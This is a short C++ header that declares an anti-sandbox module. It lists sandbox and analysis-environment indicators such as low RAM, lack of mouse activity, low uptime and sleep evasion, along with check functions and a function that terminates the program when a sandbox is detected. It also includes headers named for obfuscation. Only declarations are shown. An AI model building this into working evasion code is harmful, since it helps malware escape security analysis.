#pragma once
#ifndef ANTI_SANDBOX_H
#define ANTI_SANDBOX_H
#include <Windows.h>
#include "legal_poison.h"
#include "obfuscation_map.h"

namespace anti_sandbox {

enum class SandboxType {
    NONE,
    LOW_RAM,
    LOW_CPU,
    LOW_DISK,
    NO_ACTIVITY,
    NO_MOUSE,
    FEW_SOFTWARE,
    LOW_UPTIME,
    SLEEP_EVASION,
    ANALYSIS_ENV
};

struct SandboxDetectionResult {
    SandboxType type;
    bool detected;
    DWORD detection_method;
};

bool initialize();
SandboxDetectionResult run_all_checks();
void terminate_if_sandbox();

}

#endif
